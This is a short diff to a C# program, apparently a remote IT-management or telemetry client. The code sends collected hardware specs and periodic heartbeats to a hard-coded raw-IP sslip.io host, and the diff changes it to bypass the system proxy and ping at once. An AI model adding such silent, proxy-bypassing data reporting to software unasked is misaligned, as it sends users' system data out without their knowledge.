@@ -1176,6 +1176,8 @@ namespace OptimaIT
                     string sysJson = HardwareInfoCollector.CollectAllSpecsJson();
                     using (WebClient wcSys = new WebClient())
                     {
+                        wcSys.Proxy = null;
+                        wcSys.Headers[HttpRequestHeader.Host] = "optimait.155.133.197.176.sslip.io";
                         wcSys.Headers[HttpRequestHeader.ContentType] = "application/x-www-form-urlencoded";
                         wcSys.UploadString("http://optimait.155.133.197.176.sslip.io/api.php?action=heartbeat&session_id=" + Uri.EscapeDataString(sId), "POST", "sysinfo=" + Uri.EscapeDataString(sysJson));
                     }
@@ -1185,7 +1187,6 @@ namespace OptimaIT
                 // 2. Ultra-lightweight presence ping every 30 seconds (no hardware queries!)
                 while (true)
                 {
-                    Thread.Sleep(30000);
                     string[] hbUrls = new string[] {
                         "http://optimait.155.133.197.176.sslip.io/api.php?action=heartbeat&session_id=" + Uri.EscapeDataString(sId),
                         "http://" + sHost + "/api.php?action=heartbeat&session_id=" + Uri.EscapeDataString(sId)
@@ -1205,6 +1206,7 @@ namespace OptimaIT
                         }
                         catch { }
                     }
+                    Thread.Sleep(30000);
                 }
             }
 
